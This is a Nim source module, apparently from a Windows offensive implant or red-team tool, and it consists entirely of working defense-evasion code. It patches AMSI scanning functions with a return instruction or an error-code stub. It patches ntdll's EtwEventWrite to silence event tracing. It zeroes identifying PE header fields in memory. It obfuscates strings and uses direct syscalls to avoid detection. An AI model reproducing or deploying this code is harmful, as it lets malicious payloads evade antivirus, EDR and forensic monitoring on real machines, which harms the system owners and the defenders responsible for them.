import ../utils/global
import ../utils/winapi/handlers
import ../utils/winapi/syscall
import ../utils/winapi/ssn

const pageRw = 0x04'u32
const pageSize = 0x1000'u32
const patchRet = 0xC3'u8
const amsiScanBufferStub: array[6, byte] = [
  byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
]
const mzSig = 0x5A4D'u16
const peSig = 0x00004550'u32
const dosELfanewOff = 0x3C
const ntFileHeaderSize = 20
const ntSignatureSize = 4
const optSizeOfHeadersOff = 60

# type
#   AmsiRestoreEntry = tuple
#     target: pointer
#     orig: seq[byte]
#
# var amsiRestore: seq[AmsiRestoreEntry] = @[]
#
# proc saveAmsiRegion(p: pointer; n: int) =
#   var entry: AmsiRestoreEntry
#   entry.target = p
#   entry.orig = newSeq[byte](n)
#   if n > 0:
#     copyMem(addr entry.orig[0], p, n)
#   amsiRestore.add(entry)

proc ret_patch*() =
  # Patches selected amsi exports with a ret instruction
  if amsiAlreadyPatched: return
  let hMod = loadLibraryA(obf("amsi.dll"))
  if hMod == nil: return
  for api in [obf("AmsiScanBuffer"), obf("AmsiInitialize"), obf("AmsiScanString")]:
    let p = getProcAddress(hMod, api)
    if p == nil: continue
    if cast[ptr byte](p)[] == patchRet: continue
    var base = p
    var region = 1.csize_t
    var old: culong = 0
    if protectVirtualMemory(currentProcess, addr base, addr region, pageRw, addr old) != 0: continue
    # saveAmsiRegion(p, 1)
    cast[ptr byte](p)[] = patchRet
    discard protectVirtualMemory(currentProcess, addr base, addr region, old, addr old)
  amsiAlreadyPatched = true

proc scan_only_patch*() =
  # Patches AmsiScanBuffer with a stub that returns an error code
  if amsiAlreadyPatched: return
  let hMod = loadLibraryA(obf("amsi.dll"))
  if hMod == nil: return
  let p = getProcAddress(hMod, obf("AmsiScanBuffer"))
  if p == nil: return
  var stubPresent = true
  for i in 0 ..< amsiScanBufferStub.len:
    if cast[ptr byte](cast[int](p) + i)[] != amsiScanBufferStub[i]:
      stubPresent = false
      break
  if stubPresent:
    amsiAlreadyPatched = true
    return
  var base = p
  var region = amsiScanBufferStub.len.csize_t
  var old: culong = 0
  if protectVirtualMemory(currentProcess, addr base, addr region, pageRw, addr old) != 0: return
  # saveAmsiRegion(p, amsiScanBufferStub.len)
  copyMem(p, unsafeAddr amsiScanBufferStub[0], amsiScanBufferStub.len)
  discard protectVirtualMemory(currentProcess, addr base, addr region, old, addr old)
  amsiAlreadyPatched = true

proc patch_amsi*() =
  # Runs the configured amsi patch
  if amsiPatchMode == obf("ret_patch"):
    ret_patch()
  elif amsiPatchMode == obf("scan_only_patch"):
    scan_only_patch()

# proc check_dynamic_patch*() =
#   if dynamicAmsiPatch != obf("on"): return
#   if amsiRestore.len == 0: return
#   for entry in amsiRestore:
#     var base = entry.target
#     var region = entry.orig.len.csize_t
#     var old: culong = 0
#     if protectVirtualMemory(currentProcess, addr base, addr region, pageRw, addr old) == 0:
#       copyMem(entry.target, unsafeAddr entry.orig[0], entry.orig.len)
#       discard protectVirtualMemory(currentProcess, addr base, addr region, old, addr old)
#   amsiRestore = @[]
#   amsiAlreadyPatched = false

proc patch_etw*() =
  # Patches EtwEventWrite with a ret instruction
  if etwAlreadyPatched: return
  let hMod = getModuleHandleA(obf("ntdll.dll"))
  if hMod == nil: return
  let p = getProcAddress(hMod, obf("EtwEventWrite"))
  if p == nil: return
  if cast[ptr byte](p)[] != patchRet:
    var base = p
    var region = 1.csize_t
    var old: culong = 0
    if protectVirtualMemory(currentProcess, addr base, addr region, pageRw, addr old) == 0:
      cast[ptr byte](p)[] = patchRet
      discard protectVirtualMemory(currentProcess, addr base, addr region, old, addr old)
  etwAlreadyPatched = true

proc patch_pe_headers*() =
  # Strips identifying fields from the in memory pe headers
  if peHeadersPatch != obf("on"): return
  if peHeadersPatched: return
  let base = getModuleHandleA(currentModule = true)
  if base == nil: return
  if cast[ptr uint16](base)[] != mzSig: return
  let eLfanew = cast[ptr culong](cast[int](base) + dosELfanewOff)[]
  let ntOff = int(eLfanew)
  if cast[ptr culong](cast[int](base) + ntOff)[] != peSig: return
  let optOff = ntOff + ntSignatureSize + ntFileHeaderSize
  let headerSize = cast[ptr culong](cast[int](base) + optOff + optSizeOfHeadersOff)[]
  if headerSize == 0 or headerSize > 0x100000'u32: return
  if not syscallReady and not prepareSyscalls(): return
  let pageMask = culong(pageSize - 1)
  let regionStart = cast[pointer](cast[int](base) and not int(pageMask))
  let endOff = cast[int](base) + int(headerSize)
  let regionEnd = (endOff + int(pageMask)) and not int(pageMask)
  let regionSz = culong(regionEnd - cast[int](regionStart))
  var region = regionSz.csize_t
  var allocBase = regionStart
  var old: culong = 0
  if protectVirtualMemory(currentProcess, addr allocBase, addr region, pageRw, addr old) != 0:
    return
  var saved = newSeq[byte](int(headerSize))
  copyMem(addr saved[0], base, int(headerSize))
  zeroMem(base, int(headerSize))
  copyMem(cast[pointer](cast[int](base) + dosELfanewOff), addr saved[dosELfanewOff], sizeof(culong))
  cast[ptr uint16](base)[] = mzSig
  let metaLen = int(headerSize) - ntOff
  if metaLen > 0:
    copyMem(cast[pointer](cast[int](base) + ntOff), addr saved[ntOff], metaLen)
  zeroMem(cast[pointer](cast[int](base) + 2), dosELfanewOff - 2)
  let img = cast[int](base)
  let fh = img + optOff - ntFileHeaderSize
  cast[ptr culong](fh + 4)[] = 0
  cast[ptr culong](fh + 8)[] = 0
  cast[ptr culong](fh + 12)[] = 0
  cast[ptr byte](img + optOff + 2)[] = 0
  cast[ptr byte](img + optOff + 3)[] = 0
  let opt = img + optOff
  var ddBase = -1
  case cast[ptr uint16](opt)[]
  of 0x20B'u16: ddBase = opt + 112
  of 0x10B'u16: ddBase = opt + 96
  else: discard
  if ddBase >= 0:
    let dbgRva = int(cast[ptr culong](ddBase + 48)[])
    let dbgSz = int(cast[ptr culong](ddBase + 52)[])
    if dbgRva > 0 and dbgSz > 0 and dbgRva + dbgSz <= int(headerSize):
      zeroMem(cast[pointer](img + dbgRva), dbgSz)
    cast[ptr culong](ddBase + 32)[] = 0
    cast[ptr culong](ddBase + 36)[] = 0
    cast[ptr culong](ddBase + 48)[] = 0
    cast[ptr culong](ddBase + 52)[] = 0
  let restoreProt = old
  discard protectVirtualMemory(currentProcess, addr allocBase, addr region, restoreProt, addr old)
  peHeadersPatched = true
